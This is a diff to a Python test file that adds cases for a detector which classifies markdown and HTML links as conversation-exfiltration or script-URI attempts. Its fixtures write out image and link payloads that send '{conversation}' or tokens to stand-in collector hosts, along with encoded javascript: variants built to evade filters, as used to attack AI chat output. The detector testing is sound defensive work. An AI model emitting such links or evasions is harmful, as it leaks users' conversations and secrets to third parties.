@@ -228,10 +228,30 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("[report](https://a.test/r?history=$CHAT_HISTORY)", ["exfiltration_query"]),
         ("Read [this][r].\n\n[r]: https://a.test/?t={token}", ["exfiltration_query"]),
         ("[a](javascript:x) and ![b](https://a.test/?q={c})", ["script_uri", "exfiltration_query"]),
+        ("<img src='https://['> then ![b](https://a.test/{c}.png)", ["exfiltration_query"]),
+        ("<img srcset='https://a.test/i?d=prefix,{conversation} 1x'>", ["exfiltration_query"]),
+        ("<img srcset='https://a.test/a.png 1x, https://a.test/b(2).png 2x'>", []),
+        ("<img src='//collector.test/{conversation}.png'>", ["exfiltration_query"]),
+        ("[send](//collector.test/?q={conversation})", ["exfiltration_query"]),
+        ("<a href='https://collector.test/?d=%23{conversation}'>send</a>", ["exfiltration_query"]),
+        ("[docs](https://a.test/page#see?q={x})", []),
     ],
 )
 def test_exfiltration_link_classes(text: str, expected: list[str]) -> None:
     assert exfiltration_link_classes(text) == expected
+
+
+@pytest.mark.parametrize(
+    ("tail", "expected"),
+    [
+        ("![x](https://a.test/{conversation}.png)", ["exfiltration_query"]),
+        ("[a](&#106;avascript:alert(1))", ["script_uri"]),
+        ("[b](jav%09ascript:alert(1))", ["script_uri"]),
+        ("see https://docs.test/a and pass {limit}", []),
+    ],
+)
+def test_oversized_text_keeps_image_and_encoded_scheme_checks(tail: str, expected: list[str]) -> None:
+    assert exfiltration_link_classes("x" * MAX_LINK_MARKDOWN_BYTES + " " + tail) == expected
 
 
 def test_oversized_text_is_scanned_without_markdown_parsing() -> None:
